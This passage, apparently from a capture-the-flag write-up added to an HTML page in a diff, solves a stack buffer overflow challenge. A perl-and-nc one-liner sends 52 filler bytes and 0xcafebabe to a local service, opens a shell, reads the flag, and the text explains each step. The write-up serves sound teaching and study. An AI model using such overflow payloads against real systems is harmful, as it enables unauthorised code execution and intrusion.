+<p>we can see that <code>0xdeadbeef</code> is offset 52 bytes ahead of
+the data now in <code>overflowme</code> (0x414141…) when it’s filled to
+capacity. now let’s smash the stack by overflowing the buffer and
+writing over <code>key</code> with <code>0xcafebabe</code>:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>$ cat readme</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>bof binary is running at &quot;nc 0 9000&quot; under bof_pwn privilege. get shell and read flag</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>$ (perl -e &#39;print &quot;A&quot;x52 . &quot;\xbe\xba\xfe\xca&quot;&#39;; cat) | nc 0 9000</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>whoami</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>bof_pwn</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>cat flag</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>Daddy_I_just_pwned_a_buff3r!</span></code></pre></div>
+<p>the payload contains 52 filler bytes followed by
+<code>0xcafebabe</code> in little-endian order, and is piped to the
+binary behind port 9000 on the localhost. finally, the trailing
+<code>cat</code> does two things: keeps the standard input stream open
+to enter a newline, terminating the <code>gets()</code> call, and also
+allows us to interact with the shell. note that triggering the stack
+protector by writing over the canaries and return address located
+between the local buffer and <code>key</code> would cause a crash if
+<code>func()</code> ever returned, but fortunately, the shell is opened before
+then.</p>
+<br>
+<hr>
+</body>
+</html>
